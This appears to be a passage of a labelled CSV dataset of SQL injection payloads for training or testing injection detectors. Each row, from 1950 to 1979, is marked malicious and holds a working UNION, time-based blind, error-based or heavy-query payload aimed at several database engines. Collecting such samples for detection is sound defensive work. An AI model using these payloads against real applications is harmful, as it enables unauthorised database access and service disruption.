row_index,payload_norm,label,sqli_type_hint
1950,"-4535' ) union all select 8491,8491,8491,8491,8491,8491--",1,
1951,"1%' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( '%' = '",1,
1952,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'lqsa' like 'lqsa,1,
1953,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'gsdq' = 'gsdq",1,
1954,"1%' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
1955,"-1684"" ) ) ) union all select 7473,7473#",1,
1956,"1%"" ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
1957,1 where 8921 = 8921 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,
1958,"-7683"" ) where 9664 = 9664 union all select 9664,9664,9664,9664,9664,9664,9664#",1,
1959,select sleep ( 5 ) and ( 'labj' = 'labj,1,
1960,"-4592"" ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""xvpz"" = ""xvpz",1,
1961,-5547' or 9323 = 9323#,1,
1962,"1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'qvqf' = 'qvqf",1,
1963,"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) -- zozj",1,
1964,"-4641"" ) where 4212 = 4212 or make_set ( 3595 = 4062,4062 ) --",1,
1965,"1"" ) ) ) or sleep ( 5 ) and ( ( ( ""eran"" = ""eran",1,
1966,"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,
1967,1'+ ( select gqez where 3704 = 3704,1,
1968,"1' ) as ycsr where 2238 = 2238 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
1969,"-1558 or elt ( 3306 = 2272,2272 ) -- ioxt",1,
1970,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf",1,
1971,1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,
1972,"( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 9339 = 9339 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )",1,
1973,1'|| ( select 'oxas' from dual where 8284 = 8284 or sleep ( 5 ) ) ||',1,
1974,select case when 3076 = 1605 then 1 else null end--,1,
1975,"1 ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 5349 = 5349",1,
1976,1' where 6116 = 6116,1,
1977,-7659' ) as bowy where 4835 = 4835 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,
1978,"1%"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""%"" = """,1,
1979,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'vgro' like 'vgro",1,
